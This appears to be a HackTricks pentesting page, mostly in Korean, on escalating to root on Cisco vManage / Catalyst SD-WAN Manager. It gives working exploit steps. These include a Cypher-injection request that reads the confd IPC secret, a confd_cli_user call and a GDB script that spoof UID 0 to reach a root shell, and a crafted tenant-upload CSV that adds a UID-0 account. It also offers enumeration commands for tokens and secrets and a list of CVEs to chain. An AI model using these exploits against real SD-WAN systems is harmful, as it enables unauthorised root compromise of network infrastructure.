# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Cisco vManage / *Catalyst SD-WAN Manager*에서 `vmanage`, `netadmin`, 또는 `vmanage-admin`으로 code execution을 얻었다면, 가장 흥미로운 local privesc 표면은 보통 `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs, 그리고 root-owned import/upload handlers입니다.

controller에서 여전히 **initial foothold**가 필요하다면, 먼저 전용 control-plane 페이지를 확인하세요:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
만약 `/etc/confd/confd_ipc_secret`를 foothold에서 읽을 수 있다면, Path 1과 Path 2는 즉시 실용적이 됩니다. remote info leak 또는 webshell을 통해 들어왔다면, 이미 `vmanage-admin` SSH material이나 multitenancy upload handlers에 도달할 수 있는지도 확인하세요: 2026 연구에서는 둘 다 현실적인 stepping stones였다고 보여졌습니다.

## Path 1

(예시: [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

`confd`와 여러 binaries에 관한 일부 [documentation](http://66.218.245.39/doc/html/rn03re18.html)를 조금 더 살펴본 뒤(Cisco website 계정으로 접근 가능), IPC socket을 인증하기 위해 `/etc/confd/confd_ipc_secret`에 위치한 secret을 사용한다는 것을 알아냈습니다:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Remember our Neo4j instance? It is running under the `vmanage` user's privileges, thus allowing us to retrieve the file using the previous vulnerability:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 프로그램은 command line arguments를 지원하지 않지만 `/usr/bin/confd_cli_user`를 arguments와 함께 호출합니다. 그래서 `/usr/bin/confd_cli_user`를 우리가 원하는 arguments로 직접 호출할 수 있습니다. 하지만 현재 privileges로는 읽을 수 없으므로, rootfs에서 이를 가져와 scp를 사용해 복사하고, help를 읽은 뒤 이를 사용해 shell을 얻어야 합니다:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv 팀의 blog¹는 root shell을 얻는 세련된 방법을 설명했지만, caveat는 `/usr/bin/confd_cli_user`의 복사본이 필요하다는 점이며, 이는 root만 읽을 수 있습니다. 저는 이런 번거로움 없이 root로 privilege escalation 하는 다른 방법을 찾았습니다.

제가 `/usr/bin/confd_cli` binary를 disassemble했을 때, 다음을 관찰했습니다:

<details>
<summary>UID/GID 수집을 보여주는 Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

“ps aux”를 실행했을 때, 다음을 관찰했습니다 (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
나는 “confd_cli” 프로그램이 로그인한 사용자로부터 수집한 user ID와 group ID를 “cmdptywrapper” 애플리케이션에 전달한다고 가정했다.

첫 시도는 “cmdptywrapper”를 직접 실행하면서 `-g 0 -u 0`을 주는 것이었지만 실패했다. 중간 어딘가에서 file descriptor(-i 1015)가 생성된 것으로 보이며, 이를 속일 수는 없었다.

synacktiv의 blog(마지막 예시)에서 언급했듯이, `confd_cli` 프로그램은 command line argument를 지원하지 않지만 debugger로 영향을 줄 수 있고, 다행히 시스템에 GDB가 포함되어 있다.

나는 API `getuid`와 `getgid`가 0을 반환하도록 강제하는 GDB script를 만들었다. 이미 deserialization RCE를 통해 “vmanage” privilege를 얻었으므로, `/etc/confd/confd_ipc_secret`를 직접 읽을 수 있는 권한이 있다.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Console output</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## 경로 3 (2025 CLI 입력 검증 버그 - CVE-2025-20122)

Cisco는 나중에 자체 advisory에서 [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)에 대해 더 깔끔한 local root 경로를 문서화했다: **read-only 권한만 가진 인증된 attacker**가 manager CLI로 crafted request를 보내고, input validation이 부족해서 root로 jump할 수 있었다.

offensive 관점에서 중요한 takeaway는 다음과 같다:

1. 박스에서 *어떤 것이라도* low-priv foothold를 확보하면, 더 무거운 Path 1 / Path 2 workflow로 가기 전에 local CLI service를 먼저 test해야 한다.
2. Path 2의 artifact를 재사용해 trust boundary를 찾아라: `confd_cli` → `cmdptywrapper` → `vshell`.
3. CLI backend로 전달되는 모든 필드를 suspicious하게 취급하라: UID/GID, username, terminal metadata, imported files, 또는 나중에 root-owned helper가 소비하는 모든 값.
4. low-priv user가 local CLI socket에 도달할 수 있고 그 필드들을 influence할 수 있다면, root는 crafted request 하나만 더 있으면 된다.

appliance에 landing한 뒤의 practical workflow는 다음과 같다:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
이렇게 하면 2025 버그는 유사한 버전에서 유용한 헌팅 패턴이 됩니다: **userland에서 identity를 수집하고 더 높은 권한의 wrapper로 전달하는 local CLI shims**를 찾으세요.

**CVE-2025-20122**를 나중의 **CVE-2026-20122**와 혼동하지 마세요: 2025 이슈는 *local* CLI-to-root 버그이고, 2026 이슈는 주로 foothold를 심은 뒤 Path 1 / Path 2 / Path 4를 다시 방문하는 데 유용한 *remote* API arbitrary file overwrite입니다.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco의 2026년 2월 advisory는 또 다른 유용한 privesc 클래스를 소개했습니다: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)는 REST API의 불충분한 user-authentication mechanism 때문에 **인증된 low-priv local attacker**가 root 권한을 얻을 수 있게 했습니다.

이것이 중요한 이유는 vManage privesc가 더 이상 `confd`/TTY abuse에만 국한되지 않기 때문입니다. low-priv shell을 얻은 뒤에는 다음도 함께 찾으세요:

- 호출자를 너무 신뢰하는 localhost-only API endpoints
- 현재 계정에서 읽을 수 있는 tokens, cookies, 또는 service credentials
- 로컬에서 여전히 트리거할 수 있는 `dataservice`/REST handlers를 통해 노출된 root-only actions

실제로 `vmanage` 또는 다른 service user로 shell을 얻으면, local API abuse는 interactive CLI abuse보다 더 조용하고 자동화하기도 더 쉽습니다:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
로컬 session context가 privileged REST functionality를 실행하기에 충분하다면, API path를 선호하라: 훔친 web sessions나 API tokens와 함께 재사용, 스크립팅, 체인하기가 더 쉽다.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

또 다른 최근 패턴은 [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)이다: `netadmin` 권한을 가진 local attacker가 나중에 CLI가 안전하지 않게 처리하는 **crafted file**을 업로드할 수 있었고, 이로 인해 `root`로 command injection이 발생했다.

HackTricks 관점에서, 유용한 technique는 특정 CVE보다 더 넓다:

1. file을 허용하는 모든 CLI 또는 web workflow를 열거하라: imports, diagnostic bundles, templates, validators, backups, tenant data, 등.
2. 업로드된 file이 어디에 저장되는지, 그리고 어떤 root-owned script 또는 binary가 그것을 소비하는지 추적하라.
3. filename, file content, 또는 parsed metadata가 shell commands, wrapper scripts, 또는 `system()`-style helpers로 전달되는지 테스트하라.
4. 이미 `netadmin`에 도달할 수 있다면(valid creds, stolen session, 또는 auth-bypass chain), file-processing bugs는 종종 root로 가는 가장 빠른 경로다.

이후 Google Cloud / Mandiant는 multitenancy import path를 통해 이 bug class가 실제로 exploit된 매우 구체적인 사례를 보여주었다:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
관찰된 공격에서, 조작된 CSV가 `/etc/passwd`와 `/etc/shadow`를 수정해 임시 UID 0 계정(`troot`)을 생성했다. 이는 `tenant-upload` / `tenant-list` 스타일의 importer를 특히 흥미롭게 만든다. 이들은 단순한 data-ingestion 기능이 아니라, root-owned parser front-ends일 수 있기 때문이다.

빠른 shell-side 탐색 패턴은 다음과 같다:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
이 버그 클래스는 특히 `root`는 아니지만 `netadmin`을 부여하는 원격 foothold와 잘 연결된다.

## 연결할 만한 다른 최근 vManage/Catalyst SD-WAN Manager 취약점

- **Unauthenticated info leak (CVE-2026-20133)** – 특히 가치가 높은데, 공개 연구에서 `confd_ipc_secret` 또는 `vmanage-admin` private key를 노출할 수 있음이 밝혀졌기 때문이다. 이로써 read bug가 Path 1 또는 NETCONF pivot으로 바뀔 수 있다.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – 위의 2025 CLI bug와는 다르다; VulnCheck는 이를 이용해 webshell을 업로드했고, 그 결과 이 페이지의 local privesc 경로들이 즉시 관련 있게 된다.
- **Authenticated UI XSS (CVE-2024-20475)** – 웹 UI에서 admin session을 탈취한 뒤, 결국 `vshell` 또는 위의 local privesc 경로들 중 하나로 이어지는 API/CLI actions로 pivot한다.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – `netadmin`은 2026 crafted-file privesc에 정확히 필요한 레벨이므로 Path 5의 매우 강력한 전조다.
- **Authenticated arbitrary file write (CVE-2026-20262)** – CVE-2026-20122와 공격적 가치는 비슷하지만, 더 뒤쪽의 web UI upload path를 통해 이루어진다: 나중에 root나 management-plane web tier가 파싱할 위치에 write한다.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 침투 사례에서 공격자들이 더 오래된 취약한 SD-WAN build로 롤백한 뒤, 예전 CLI root bug를 악용하고, 원래 버전을 복원할 수 있음이 드러났다.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 전용 SD-WAN control-plane 페이지에서 더 잘 문서화되어 있다; `vmanage-admin`에 SSH key를 append할 수 있어, 이 페이지를 다시 살펴보는 데 필요한 local foothold를 제공한다.



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
